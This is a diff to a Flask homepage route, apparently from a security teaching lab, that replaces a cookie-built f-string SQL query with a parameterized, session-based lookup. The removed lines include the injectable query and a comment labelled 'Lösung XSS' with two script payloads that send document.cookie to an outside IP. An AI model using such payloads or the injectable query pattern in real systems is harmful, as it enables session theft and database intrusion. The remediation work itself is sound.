@@ -1,24 +1,28 @@
-from flask import render_template, request, Blueprint
+from flask import render_template, session, redirect, url_for, Blueprint
 from src.db import mysql
 
-main_routes = Blueprint("main_routes",__name__)
+main_routes = Blueprint("main_routes", __name__)
 
 @main_routes.route("/")
 def homepage():
-    cookie = request.cookies.get('name')
-    print(cookie)
+    username = session.get("username")
+    if not username:
+        return redirect(url_for("auth_routes.user_login"))
+
     conn = mysql.connect()
     cursor = conn.cursor()
-    if(cookie is not None):
-      cursor.execute(f"SELECT username from users where username = '{cookie}'")
-      name = cursor.fetchone()[0]
-    else:
-        name = "None"
-    print(name)
-    
-    return render_template('home.html', cookie=cookie, name=name)
 
+    cursor.execute(
+        "SELECT username FROM users WHERE username = %s",
+        (username,)
+    )
+    user = cursor.fetchone()  # liefert z. B. ("admin",)
+    cursor.close()
+    conn.close()
 
-# Lösung XSS:
- # 1: <script>var i = new Image(0, 0); i.src=`http://192.168.0.7:5000/?cookie=${document.cookie}`; document.body.appendChild(i);</script>
- # 2: <script>new Image().src="http://192.168.0.7:5000/?c="+escape(document.cookie)</script>
+    if not user:
+        session.clear()
+        return redirect(url_for("auth_routes.user_login"))
+
+    name = user[0]
+    return render_template("home.html", username=name)
